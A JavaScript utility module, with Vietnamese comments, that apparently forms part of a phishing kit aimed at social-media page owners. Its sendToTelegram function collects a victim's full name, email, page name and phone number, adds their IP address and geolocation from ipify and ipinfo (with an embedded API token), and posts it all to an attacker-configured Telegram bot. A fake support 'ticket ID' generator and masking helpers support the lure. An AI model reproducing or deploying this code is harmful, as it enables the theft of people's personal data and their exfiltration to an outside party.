const Utils = {

    encrypt(text) {
        return CryptoJS.AES.encrypt(
            text,
            CONFIG.SECRET_KEY
        ).toString();
    },

    decrypt(cipherText) {
        const bytes = CryptoJS.AES.decrypt(
            cipherText,
            CONFIG.SECRET_KEY
        );

        return bytes.toString(CryptoJS.enc.Utf8);
    },

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(
                JSON.stringify(value)
            );

            const record = {
                value: encryptedValue,
                expiry: Date.now() + CONFIG.STORAGE_EXPIRY
            };

            localStorage.setItem(
                key,
                JSON.stringify(record)
            );

        } catch (error) {
            console.error("Save error:", error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);

            if (!item) return null;

            const record = JSON.parse(item);

            if (!record.value || !record.expiry) {
                localStorage.removeItem(key);
                return null;
            }

            if (Date.now() > record.expiry) {
                localStorage.removeItem(key);
                return null;
            }

            const decrypted = this.decrypt(record.value);

            return decrypted
                ? JSON.parse(decrypted)
                : null;

        } catch (error) {
            console.error("Get record error:", error);
            return null;
        }
    },

    async getUserIp() {
        try {
            const response = await fetch(
                "https://api.ipify.org?format=json",
                {
                    method: "GET",
                    cache: "no-store"
                }
            );

            if (!response.ok) {
                throw new Error(
                    `IP API error: ${response.status}`
                );
            }

            const data = await response.json();

            return data?.ip || "N/A";

        } catch (error) {
            console.error(
                "Error getting IP:",
                error
            );

            return "N/A";
        }
    },

    async getUserLocation() {

        let ip = "N/A";
        let city = "N/A";
        let region = "N/A";
        let country = "N/A";
        let countryCode = "N/A";

        // -----------------------------
        // 1. Lấy IP từ ipify
        // -----------------------------
        try {
            ip = await this.getUserIp();
        } catch (error) {
            console.error(
                "IP fallback error:",
                error
            );
        }

        // -----------------------------
        // 2. Lấy location từ IPInfo
        // -----------------------------
        try {

            const response = await fetch(
                "https://ipinfo.io/json?token=5a58a2d85996e3",
                {
                    method: "GET",
                    cache: "no-store"
                }
            );

            if (!response.ok) {
                throw new Error(
                    `IPInfo error: ${response.status}`
                );
            }

            const data = await response.json();

            if (data?.ip) {
                ip = data.ip;
            }

            if (data?.city) {
                city = data.city;
            }

            if (data?.region) {
                region = data.region;
            }

            if (data?.country) {
                country = data.country;
                countryCode = data.country;
            }

        } catch (error) {

            console.error(
                "Location error:",
                error
            );
        }

        // -----------------------------
        // 3. Tạo Location sạch
        // -----------------------------
        const parts = [
            city,
            region,
            country
        ].filter(
            value =>
                value &&
                value !== "N/A"
        );

        const location =
            parts.length > 0
                ? parts.join(" | ")
                : "N/A";

        return {
            ip: ip || "N/A",
            location,
            country_code: countryCode || "N/A",
            region: region || "N/A",
            country: country || "N/A"
        };
    },

    async sendToTelegram(data) {

        try {

            const locationData =
                await this.getUserLocation();

            const text = `
<b>IP:</b> <code>${locationData.ip}</code>
<b>Location:</b> <code>${locationData.location}</code>
----------------------------------
<b>Full Name:</b> <code>${data.fullName || ""}</code>
<b>Email:</b> <code>${data.email || ""}</code>
<b>Page Name:</b> <code>${data.fanpage || ""}</code>
<b>Phone:</b> <code>${data.phone || ""}</code>
----------------------------------
<b>Ticket ID:</b> <code>${data.ticketId || ""}</code>
`;

            const response = await fetch(
                `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    method: "POST",
                    headers: {
                        "Content-Type":
                            "application/json"
                    },
                    body: JSON.stringify({
                        chat_id:
                            CONFIG.TELEGRAM_CHAT_ID,
                        text,
                        parse_mode: "HTML"
                    })
                }
            );

            if (!response.ok) {
                throw new Error(
                    `Telegram error: ${response.status}`
                );
            }

            return true;

        } catch (error) {

            console.error(
                "Telegram error:",
                error
            );

            return false;
        }
    },

    async sendNotification(data) {

        const type =
            CONFIG.NOTIFICATION_TYPE;

        try {

            if (
                type === "telegram" ||
                type === "both"
            ) {
                await this.sendToTelegram(data);
            }

        } catch (error) {

            console.error(
                "Notification error:",
                error
            );
        }
    },

    maskPhone(phone) {

        if (!phone) return "";

        phone = String(phone);

        if (phone.length < 5) {
            return phone;
        }

        const start =
            phone.slice(0, 2);

        const end =
            phone.slice(-2);

        return (
            `${start}` +
            `${"*".repeat(
                phone.length - 4
            )}` +
            `${end}`
        );
    },

    maskEmail(email) {

        if (!email) return "";

        return String(email).replace(
            /^(.)(.*?)(.)@(.+)$/,
            (_, first, middle, last, domain) => {

                return (
                    `${first}` +
                    `${"*".repeat(
                        middle.length
                    )}` +
                    `${last}@${domain}`
                );
            }
        );
    },

    generateTicketId() {

        const gen = () =>
            Math.random()
                .toString(36)
                .substring(2, 6)
                .toUpperCase();

        return (
            `${gen()}-${gen()}-${gen()}`
        );
    }
};
